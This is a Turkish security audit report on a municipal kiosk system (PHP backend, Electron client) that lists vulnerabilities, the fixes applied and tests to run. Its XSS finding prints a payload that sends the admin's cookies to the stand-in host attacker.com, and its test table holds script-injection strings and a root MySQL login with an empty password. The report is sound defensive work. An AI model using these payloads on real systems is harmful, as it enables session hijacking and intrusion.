# Güvenlik Denetimi Raporu — Silivri Kiosk Sistemi

**Tarih:** 4 Mart 2026  
**Kapsam:** Tüm kaynak dosyalar (statik analiz)  
**Genel Risk Değerlendirmesi:** `HIGH` → Düzeltmeler uygulandıktan sonra `LOW`

---

## İçindekiler

1. [Kritik / Yüksek Bulgular](#1-kritik--yüksek-bulgular)
2. [Orta Seviye Bulgular](#2-orta-seviye-bulgular)
3. [Düşük Seviye Bulgular](#3-düşük-seviye-bulgular)
4. [Gözlemler ve Sertleştirme](#4-gözlemler-ve-sertleştirme)
5. [Uygulanan Tüm Değişiklikler](#5-uygulanan-tüm-değişiklikler)
6. [Kod Dışı Yapılması Gerekenler](#6-kod-dışı-yapılması-gerekenler)
7. [Test Önerileri](#7-test-önerileri)

---

## 1. Kritik / Yüksek Bulgular

### 🔴 Bulgu 1 — Hardcoded Root Veritabanı Kimlik Bilgileri
**Ciddiyet:** `CRITICAL` | **Referans:** CWE-798, CWE-521 / OWASP A07:2021

| Alan | Detay |
|------|-------|
| **Etkilenen Dosya** | `backend/db.php` |
| **Sorun** | `DB_USER = 'root'` ve `DB_PASS = ''` doğrudan kaynak koduna sabitlenmişti. Repository'ye erişen herhangi biri sıfır kimlik doğrulamayla MySQL'e root olarak bağlanabilirdi. |
| **Saldırı Vektörü** | `mysql -u root -h 127.0.0.1` → tam veritabanı dökümü, şema değişikliği, admin şifre sıfırlama veya `FILE` yetkisi varsa dosya sistemi yazma. |

**Uygulanan Düzeltme:**
- `backend/config.php` adında yeni bir kimlik bilgisi dosyası oluşturuldu.
- `backend/db.php` bu dosyayı `require_once` ile yüklüyor; değerler artık kaynak kodunda yok.
- `backend/config.example.php` şablon olarak eklendi.
- `backend/config.php` `.gitignore`'a eklendi — artık commit edilemez.

```php
// db.php (düzeltme sonrası)
$_configPath = __DIR__ . '/config.php';
if (!is_file($_configPath)) {
    throw new RuntimeException('config.php bulunamadı. config.example.php dosyasını kopyalayıp düzenleyin.');
}
require_once $_configPath;
```

---

### 🔴 Bulgu 2 — Kimlik Doğrulamasız API Üzerinden Gizli Anahtar Sızıntısı
**Ciddiyet:** `HIGH` | **Referans:** CWE-200, CWE-312 / OWASP A02:2021, A01:2021

| Alan | Detay |
|------|-------|
| **Etkilenen Dosya** | `backend/api.php` (settings endpoint) |
| **Sorun** | `GET /api.php?action=settings` kimlik doğrulaması gerektirmiyordu ve `kiosk_settings` tablosundaki **tüm satırları** döndürüyordu. Bu, gizli ayarları herkese açık hale getiriyordu. |
| **Saldırı Vektörü** | Herhangi bir origin'den yapılan basit bir GET isteği API anahtarını açığa çıkarır. Renderer tarafı bu anahtarı `settings` değişkeninde plain text olarak saklar. |

**Uygulanan Düzeltme:**

```php
// api.php (düzeltme sonrası)
case 'settings':
    $RENDERER_SAFE_KEYS = ['background_image', 'municipality_logo'];
    $stmt = $db->query("SELECT setting_key, setting_value FROM kiosk_settings");
    $settings = [];
    while ($row = $stmt->fetch()) {
        if (in_array($row['setting_key'], $RENDERER_SAFE_KEYS, true)) {
            $settings[$row['setting_key']] = $row['setting_value'];
        }
    }
    sendJson(200, ['success' => true, 'data' => $settings]);
    break;
```

---

### 🔴 Bulgu 3 — `<script>` Bloğunda Stored XSS (`</script>` Kaçışı)
**Ciddiyet:** `HIGH` | **Referans:** CWE-79 / OWASP A03:2021

| Alan | Detay |
|------|-------|
| **Etkilenen Dosya** | `backend/admin.php` (sayfa alt kısmındaki `<script>` bloğu) |
| **Sorun** | `$editItem` verisi `json_encode($editItem, JSON_UNESCAPED_UNICODE)` ile doğrudan `<script>` bloğuna enjekte ediliyordu. `json_encode` `</script>` karakterini encode etmez; veritabanına `</script><script>alert(1)</script>` içeren bir kayıt eklenirse tarayıcı bunu script etiketi sınırı olarak ayrıştırır. |
| **Saldırı Vektörü** | `title` alanına `foo</script><img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>` yazılması → admin oturumu ele geçirme. |

**Uygulanan Düzeltme:**

```php
// admin.php (düzeltme sonrası)
fillEdit(<?=json_encode($editItem, JSON_UNESCAPED_UNICODE | JSON_HEX_TAG | JSON_HEX_AMP)?>);
```

`JSON_HEX_TAG` bayrağı `<` ve `>` karakterlerini `\u003C` / `\u003E` olarak encode eder — `</script>` kaçışı artık mümkün değil.

---

## 2. Orta Seviye Bulgular

### 🟠 Bulgu 4 — CSS Enjeksiyonu via `style.backgroundImage`
**Ciddiyet:** `MEDIUM` | **Referans:** CWE-79 (CSS Injection) / OWASP A03:2021

| Alan | Detay |
|------|-------|
| **Etkilenen Dosya** | `electron-client/assets/js/renderer.js` |
| **Sorun** | `settings.background_image` değeri doğrulama yapılmadan `` `url(${settings.background_image})` `` şeklinde CSS'e enjekte ediliyordu. `data:` URI veya `javascript:` şemasını içeren bir değer, belirli render engine'larda XSS yüzeyine dönüşebilir. |

**Uygulanan Düzeltme:**

```javascript
function applySettings() {
    const raw = settings.background_image;
    if (!raw) return;
    try {
        const u = new URL(raw);
        if (u.protocol !== 'https:') return; // data:, javascript: vb. blokla
        const safe = u.href.replace(/"/g, '%22').replace(/[()]/g, encodeURIComponent);
        document.getElementById('splash-bg').style.backgroundImage = `url("${safe}")`;
    } catch { /* Geçersiz URL — yoksay */ }
}
```

---

### 🟠 Bulgu 5 — CORS Wildcard `*` Fallback
**Ciddiyet:** `MEDIUM` | **Referans:** CWE-942 / OWASP A05:2021

| Alan | Detay |
|------|-------|
| **Etkilenen Dosya** | `backend/api.php` |
| **Sorun** | `Origin` başlığı olmayan isteklerde `Access-Control-Allow-Origin: *` döndürülüyordu. `curl`, servis işçileri veya uzantılar gibi `Origin` başlığı göndermeyen her client, wildcard yanıt alıp tüm API yanıtlarını okuyabilirdi. |

**Uygulanan Düzeltme:**

```php
// api.php (düzeltme sonrası)
if (!empty($origin) && in_array($origin, $allowedOrigins, true)) {
    header('Access-Control-Allow-Origin: ' . $origin);
    header('Vary: Origin');
}
// Origin yoksa veya izin listesinde değilse ACAO başlığı hiç eklenmez.
```

---

### 🟠 Bulgu 6 — Tüm Domain'lere Toplu Tarayıcı İzni (Geolocation + Media)
**Ciddiyet:** `MEDIUM` | **Referans:** CWE-284 / OWASP A01:2021

| Alan | Detay |
|------|-------|
| **Etkilenen Dosya** | `electron-client/assets/js/main.js` |
| **Sorun** | `setPermissionRequestHandler` tüm izin verilen domain'lere `geolocation` ve `media` izinlerini sessizce onaylıyordu. İzin verilen herhangi bir sitedeki XSS açığı, kullanıcı onayı olmadan mikrofonu aktive edebilir veya konum bilgisi çalabilirdi. |

**Uygulanan Düzeltme:**

```javascript
const GEO_ALLOWED_ORIGINS = [
    'https://maps.google.com',
    'https://www.google.com',
];
mainWindow.webContents.session.setPermissionRequestHandler(
    (webContents, permission, callback) => {
        try {
            const origin = new URL(webContents.getURL()).origin;
            if (permission === 'geolocation' &&
                GEO_ALLOWED_ORIGINS.some(o => origin === o || ...)) {
                return callback(true);
            }
        } catch { }
        callback(false); // media ve diğer tüm izinler reddedildi
    }
);
```

---

## 3. Düşük Seviye Bulgular

### 🟡 Bulgu 7 — RuntimeException Mesajının Dışarıya Sızması
**Ciddiyet:** `LOW` | **Referans:** CWE-209 / OWASP A09:2021

| Alan | Detay |
|------|-------|
| **Etkilenen Dosya** | `backend/api.php` |
| **Sorun** | `catch (RuntimeException $e)` bloğu `$e->getMessage()` içeriğini JSON yanıtında doğrudan döndürüyordu. Gelecekteki bir hata mesajı DSN bileşenlerini (host, port, db adı) ifşa edebilir. |

**Uygulanan Düzeltme:**

```php
} catch (RuntimeException $e) {
    error_log('[API RuntimeException] ' . $e->getMessage()); // sadece logla
    sendJson(503, ['success' => false, 'error' => 'Servis geçici olarak kullanılamıyor.']);
}
```

---

## 4. Gözlemler ve Sertleştirme

### Content Security Policy Sıkılaştırması
**Dosya:** `electron-client/index.html`

| Özellik | Önceki | Sonraki |
|---------|--------|---------|
| `default-src` | `'self' 'unsafe-inline'` | `'self'` |
| `script-src` | `'self' 'unsafe-inline'` | `'self'` |
| `img-src` | `data: https: http:` | `data: https:` (HTTP kaldırıldı) |

`'unsafe-inline'` kaldırılarak inline script çalıştırma engellendi. Bunun çalışabilmesi için tüm `onclick="..."` nitelikleri de kaldırılıp `addEventListener` ile değiştirildi.

---

### Inline `onclick` Niteliklerinin Kaldırılması
**Dosya:** `electron-client/index.html` + `electron-client/assets/js/renderer.js`

CSP değişikliğiyle uyumlu olması için 4 inline olay yöneticisi JavaScript tarafına taşındı:

```javascript
// renderer.js — init() içinde
document.getElementById('screen-splash')?.addEventListener('click', startSession);
document.getElementById('btn-go-home')?.addEventListener('click', goHome);
document.getElementById('btn-retry-services')?.addEventListener('click', () => fetchServices());
document.getElementById('btn-cancel-timeout')?.addEventListener('click', cancelTimeout);
```

---

### CDN Kaynaklarına SRI Hash Eklenmesi
**Dosya:** `backend/admin.php`, `electron-client/index.html`

CDN tarafındaki olası içerik manipülasyonuna karşı tüm dış kaynaklara `integrity` ve `crossorigin` nitelikleri eklendi:

| Kaynak | Hash |
|--------|------|
| Bootstrap 5.3.2 CSS | `sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN` |
| Bootstrap 5.3.2 JS Bundle | `sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL` |
| Bootstrap Icons 1.11.3 | `sha384-XGjxtQfXaH2tnPFa9x+ruJTuLE3Aa6LhHSWRr1XeTyhezb4abCG4ccI5AkVDxqC+` |
| SortableJS 1.15.2 | `sha384-BSxuMLxX+FCbTdYec3TbXlnMGEEM2QXTFdtDaveen71o+jswm2J36+xFqp8k4VHM` |

---

### Oturum Çerezi Güvenliği
**Dosya:** `backend/admin.php`

`session_start()` öncesine `session_set_cookie_params()` eklendi:

```php
session_set_cookie_params([
    'lifetime' => 0,
    'path'     => '/',
    'secure'   => false,   // HTTPS'e geçince true yapın
    'httponly' => true,    // JavaScript'in cookie'ye erişimini engeller
    'samesite' => 'Strict', // CSRF saldırılarına karşı ek katman
]);
session_start();
```

---

### Giriş Hız Sınırlama (Rate Limiting)
**Dosya:** `backend/admin.php`

`sleep(1)` tek başına paralel brute-force saldırılarını engellemez. Oturum tabanlı deneme sayacı eklendi:

- 5 başarısız denemeden sonra hesap **15 dakika** kilitlenir.
- Başarılı girişte sayaç sıfırlanır.
- Kalan deneme hakkı kullanıcıya gösterilir.

---

### `.gitignore` Oluşturulması
**Dosya:** `.gitignore` _(yeni)_

```gitignore
# Ortama özgü kimlik bilgileri — ASLA commit etme
backend/config.php

# Node modules
electron-client/node_modules/

# macOS
.DS_Store
```

---

## 5. Uygulanan Tüm Değişiklikler

| Dosya | Değişiklik Türü | Açıklama |
|-------|-----------------|----------|
| `backend/config.php` | 🆕 Yeni | Ortama özgü DB kimlik bilgileri (gitignore'da) |
| `backend/config.example.php` | 🆕 Yeni | Şablon dosya — repo'ya commit edilir |
| `.gitignore` | 🆕 Yeni | `config.php` ve diğer hassas dosyalar için |
| `backend/db.php` | ✏️ Düzenlendi | `root`/boş şifre kaldırıldı → `config.php` yükleniyor |
| `backend/api.php` | ✏️ Düzenlendi | CORS wildcard, settings filtresi, hata mesajı sızıntısı |
| `backend/admin.php` | ✏️ Düzenlendi | JSON_HEX_TAG, session cookie, rate limiting, SRI |
| `electron-client/assets/js/renderer.js` | ✏️ Düzenlendi | CSS enjeksiyon koruması, event listener'lar |
| `electron-client/assets/js/main.js` | ✏️ Düzenlendi | İzin kısıtlaması (geolocation only, media reddedildi) |
| `electron-client/index.html` | ✏️ Düzenlendi | CSP sıkılaştırma, inline onclick kaldırma, SRI |

---

## 6. Kod Dışı Yapılması Gerekenler

> Bu adımlar geliştirici tarafından manuel olarak yapılmalıdır.

1. **MySQL kullanıcısı oluşturun** — `root` yerine kısıtlı yetkili kullanıcı:
   ```sql
   CREATE USER 'kiosk_app'@'127.0.0.1' IDENTIFIED BY '<güçlü-rastgele-şifre>';
   GRANT SELECT, INSERT, UPDATE, DELETE ON silivri_kiosk.* TO 'kiosk_app'@'127.0.0.1';
   FLUSH PRIVILEGES;
   ```

2. **`backend/config.php` şifresini güncelleyin** — `ŞIFRE_BURAYA` yerine gerçek şifreyi ve `kiosk_app` kullanıcı adını yazın.

3. **HTTPS'e geçince** `config.php`'de `'secure' => true` yapın ve `api.php`'deki `allowedOrigins` listesini güncelleyin.

4. **Gizli ayar sızıntısını değerlendirin** — Herhangi bir gizli anahtar loglarda veya cache'de açığa çıktıysa iptal edip yenileyin.

---

## 7. Test Önerileri

| Test | Hedef | Yöntem |
|------|-------|--------|
| DB root bağlantısı | Kimlik bilgisi kaldırma | `mysql -u root -h 127.0.0.1 --password='' silivri_kiosk` → bağlantı başarısız olmalı |
| API key sızıntısı | Settings filtresi | `curl 'http://127.0.0.1/kiosk-sistem/backend/api.php?action=settings'` → yanıtta yalnızca `RENDERER_SAFE_KEYS` görünmeli |
| XSS (JSON_HEX_TAG) | Script kaçışı | `title = 'test</script><script>alert(1)</script>'` içeren kayıt eklenmeli → admin sayfasında `</script>` ham olarak görünmemeli |
| CORS wildcard | Origin yokken | `curl http://127.0.0.1/kiosk-sistem/backend/api.php?action=urls` → `Access-Control-Allow-Origin: *` **görünmemeli** |
| CSS enjeksiyon | background_image | `background_image = "javascript:alert(1)"` ayarlanması → uygulanmamalı |
| Brute-force kilidi | Rate limiting | 5 hatalı giriş → 6. denemede kilit mesajı görünmeli |
| SRI | CDN manipülasyon | Bootstrap CSS URL'sinin içeriği değiştirilirse tarayıcı yüklemeyi reddetmeli |
